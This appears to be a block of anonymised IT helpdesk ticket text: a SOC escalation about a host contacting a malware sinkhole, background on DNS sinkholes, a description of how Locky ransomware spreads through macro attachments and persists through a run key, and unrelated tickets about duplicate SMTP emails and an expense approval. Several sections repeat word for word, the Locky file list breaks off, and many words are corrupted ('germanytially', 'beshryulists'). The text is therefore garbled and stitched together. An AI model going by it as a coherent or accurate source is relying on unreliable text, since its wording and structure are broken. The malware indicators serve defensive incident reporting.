this return traffic indicates that lpawx210968sf/61.01.52.02617 has most likely attempted to visit a domain name which is being sinkholed. dns sinkholes are dns servers that give out false information in order to prevent the use of the domain for which ip address resolution has been requested. sinkhole traffic is a possible indicator of an infected computer that is reaching out to a controller that has been taken over by a law enforcement or research organization as part of a malware mitigation effort. traffic to a sinkhole should be examined for characteristics of automated activity. in some cases, an administrator may be curious about a particular domain and browse to it, triggering the signature. repeated automated requests to a sinkhole, however, are a clear indication of a malware infection.

we are escalating this incident to you via a high priority ticket per our default escalation policies. if you would like us to handle these incidents differently in the future (see below for handling options), or if you have any further questions or concerns, please let us know either by corresponding to us via this ticket and delegating the ticket back to the soc, or by calling us at . 
1) ticket only escalation for sinkhole domain alerts (explicit notification via a medium priority ticket (no phone call))
2) auto-resolve sinkhole domain alerts directly to the portal (no explicit notification but events will be available for reporting purposes in the portal)

sincerely,
secureworks soc


=========================
technical details
=========================
the domain name system (dns) is a hierarchical naming system for any resource connected to the internet or a private network which has the primary purpose of associating various information with domain names assigned to each of the participating entities. it is primarily used for translating domain names to the numerirtcal ip addresses for the purpose of locating service and devices on a network. 

the domain name system distributes the responsibility of assigning domain names and mapping those names to ip addresses by designating authoritative name servers for each domain. authoritative name servers are assigned to be responsible for their supported domains, and may delegate authority over subdomains to other name servers. the domain name system also specifies the technical functionality of this database service. it defines the dns protocol, a detailed specification of the data structures and data communication exchanges used in dns, as part of the internet protocol suite.

dns sinkholes are dns servers that give out incorrect information in order to prevent the use of the domain name for which ip address resolution is being attempted. when a client requests to resolve the address of a sinkholed hole or domain, the sinkhole returns a non-routable address or any address except for the real address. this germanytially denies the client a connection to the target host. using this method, compromised clients can easily be found using sinkhole logs. another method of detecting compromised hosts is during operations in which servers being used for c2 (command and control) purposes are taken over by law enforcement as part of a malware mitigation effort. traffic to a sinkhole should be examined for characteristics of automated activity. in some cases, an administrator may be curious about a particular domain and browse to it, triggering the signature. repeated automated requests to a sinkhole are a clear indication of infection by a trojan of some sort.

connections to sinkholes may seem somewhat benign, but the ramdntyifications certainly include information leakage to some extent. although sinkhole operators are unlikely to use any personally identifiable information they may capture from a trojan's communication, it may become public knowledge that ""company x is infected with y"", which may lead to reputational damage.

additionally, some sinkholes are feeding ip addresses of victims to beshryulists, which may impede access to certain services, like sending email. finally, some trojans may connect to multiple controller domains/hostnames, and even though some of them may be sinkholed, there may be others that are not, leading to the possibility of remote code execution or information leakage to malicious parties in some cases.

incident overview
=========================
we are seeing your 10.32.100.17/isensor03.company.com device generating '51793 vid36000 server response with anubis sinkhole cookies set - probable infected asset' alerts for traffic (not blocked) from port 80/tcp of 195.38.137.100 to port 3720/tcp of your lpawx210968sf/61.01.52.02617 device indicating that the host is most likely infected with malware. 

this return traffic indicates that lpawx210968sf/61.01.52.02617 has most likely attempted to visit a domain name which is being sinkholed. dns sinkholes are dns servers that give out false information in order to prevent the use of the domain for which ip address resolution has been requested. sinkhole traffic is a possible indicator of an infected computer that is reaching out to a controller that has been taken over by a law enforcement or research organization as part of a malware mitigation effort. traffic to a sinkhole should be examined for characteristics of automated activity. in some cases, an administrator may be curious about a particular domain and browse to it, triggering the signature. repeated automated requests to a sinkhole, however, are a clear indication of a malware infection.

we are escalating this incident to you via a high priority ticket per our default escalation policies. if you would like us to handle these incidents differently in the future (see below for handling options), or if you have any further questions or concerns, please let us know either by corresponding to us via this ticket and delegating the ticket back to the soc, or by calling us at . 
1) ticket only escalation for sinkhole domain alerts (explicit notification via a medium priority ticket (no phone call))
2) auto-resolve sinkhole domain alerts directly to the portal (no explicit notification but events will be available for reporting purposes in the portal)

sincerely,
secureworks soc


=========================
technical details
=========================
the domain name system (dns) is a hierarchical naming system for any resource connected to the internet or a private network which has the primary purpose of associating various information with domain names assigned to each of the participating entities. it is primarily used for translating domain names to the numerirtcal ip addresses for the purpose of locating service and devices on a network. 

the domain name system distributes the responsibility of assigning domain names and mapping those names to ip addresses by designating authoritative name servers for each domain. authoritative name servers are assigned to be responsible for their supported domains, and may delegate authority over subdomains to other name servers. the domain name system also specifies the technical functionality of this database service. it defines the dns protocol, a detailed specification of the data structures and data communication exchanges used in dns, as part of the internet protocol suite.

dns sinkholes are dns servers that give out incorrect information in order to prevent the use of the domain name for which ip address resolution is being attempted. when a client requests to resolve the address of a sinkholed hole or domain, the sinkhole returns a non-routable address or any address except for the real address. this germanytially denies the client a connection to the target host. using this method, compromised clients can easily be found using sinkhole logs. another method of detecting compromised hosts is during operations in which servers being used for c2 (command and control) purposes are taken over by law enforcement as part of a malware mitigation effort. traffic to a sinkhole should be examined for characteristics of automated activity. in some cases, an administrator may be curious about a particular domain and browse to it, triggering the signature. repeated automated requests to a sinkhole are a clear indication of infection by a trojan of some sort.

connections to sinkholes may seem somewhat benign, but the ramdntyifications certainly include information leakage to some extent. although sinkhole operators are unlikely to use any personally identifiable information they may capture from a trojan's communication, it may become public knowledge that ""company x is infected with y"", which may lead to reputational damage.

additionally, some sinkholes are feeding ip addresses of victims to beshryulists, which may impede access to certain services, like sending email. finally, some trojans may connect to multiple controller domains/hostnames, and even though some of them may be sinkholed, there may be others that are not, leading to the possibility of remote code execution or information leakage to malicious parties in some cases.

=========================
technical details
=========================
locky is a new ransomware that encrypts your data using aes encryption and then demands a form of digital currency to decrypt your files. locky is distributed by malicious attachments to spam emails and recently seen in massive phishing campaigns with microsoft word document attachments. ctu researchers have observed attachments (for example, inwarehouse_tool_j-81076273.doc) with embedded macro code used to download the locky payload. filenames seem to be constructed by using eight random numbers following ""inwarehouse_tool_j-"". a potential victim receiving the attachment needs to open it and enable the macro which will then initiate the payload download over http.

once locky is running on the compromised system, it drops a copy of itself in the %temp% directory under the affected user's profile and sets a registry run key to ensure persistence across reboots. the dropped file has used the filenames ladybi.exe and svchost.exe. locky also sets the hkcu\software\locky registry key and creates the values listed in the ctu tips article provided in the references section. 

locky also checks for the following registry keys, which may indicate the presence of security-related software:
• software\kasperskylab
• software\eset
• software\avast software

the victim is notified of the infection when the desktop background image changes (see figure 4 in ctu tips). locky places the same instructions in a text file and a bitmap image on the desktop and displays both of these files to the victim.

there is unconfirmed speculation that the operators of the botnet distributing the locky malware are also responsible for the bugat v5 (dridex) banking trojan. the spam emanates from the same botnet that distributes bugat v5 and other threats such as the shiz/shifu malware, but this finding is not conclusive because the botnet is used by various affiliates at different times.

locky may also have the capability to locate network resources and encrypt files in those locations. ctu researchers are analysing a block of code that may be used to enumerate network-based locations (2016-02-19).

locky attempts encryption on the following files and file types:

=========================
technical details
=========================
locky is a new ransomware that encrypts your data using aes encryption and then demands a form of digital currency to decrypt your files. locky is distributed by malicious attachments to spam emails and recently seen in massive phishing campaigns with microsoft word document attachments. ctu researchers have observed attachments (for example, inwarehouse_tool_j-81076273.doc) with embedded macro code used to download the locky payload. filenames seem to be constructed by using eight random numbers following ""inwarehouse_tool_j-"". a potential victim receiving the attachment needs to open it and enable the macro which will then initiate the payload download over http.

once locky is running on the compromised system, it drops a copy of itself in the %temp% directory under the affected user's profile and sets a registry run key to ensure persistence across reboots. the dropped file has used the filenames ladybi.exe and svchost.exe. locky also sets the hkcu\software\locky registry key and creates the values listed in the ctu tips article provided in the references section. 

locky also checks for the following registry keys, which may indicate the presence of security-related software:
• software\kasperskylab
• software\eset
• software\avast software

the victim is notified of the infection when the desktop background image changes (see figure 4 in ctu tips). locky places the same instructions in a text file and a bitmap image on the desktop and displays both of these files to the victim.

there is unconfirmed speculation that the operators of the botnet distributing the locky malware are also responsible for the bugat v5 (dridex) banking trojan. the spam emanates from the same botnet that distributes bugat v5 and other threats such as the shiz/shifu malware, but this finding is not conclusive because the botnet is used by various affiliates at different times.

locky may also have the capability to locate network resources and encrypt files in those locations. ctu researchers are analysing a block of code that may be used to enumerate network-based locations (2016-02-19).

locky attempts encryption on the following files and file types:

reporting_tool application sending multiple emails via smtp : hqap100.company.com,"hi ramdnty,
as discussed, we send emails (also called subscriptions) out of reporting_tool application on a daily basis.
the smtp server has remained the same for last 2 years. 
since 29th july, the users are receiving duplicate emails. for example, see attached the duplicate emails i have been receiving daily.
one more thing to note is that reporting_tool maintains a count of emails sent per day but the count has not doubled indicating that smtp server seems to be processing it twice instead of reporting_tool sending them multiple times.
smtp server : hqap100.company.com
the issue has been escalate to higher management. 
greatly appreciate if you could look into this as the earliest. let me know if you need more details.

1.       jdlxkygf wlzqaivr: davidthd's former manager (and expense report approver), gergrythg bigleman, is no longer with the company. davidthd has an expense report in gergrythg's queue. 
2.       how does mikhghytr ramdntysey get access to that to approve and/or forward to the correct manager? 
3.       how can we ensure there are no other requests in gergrythg's universal worklist?
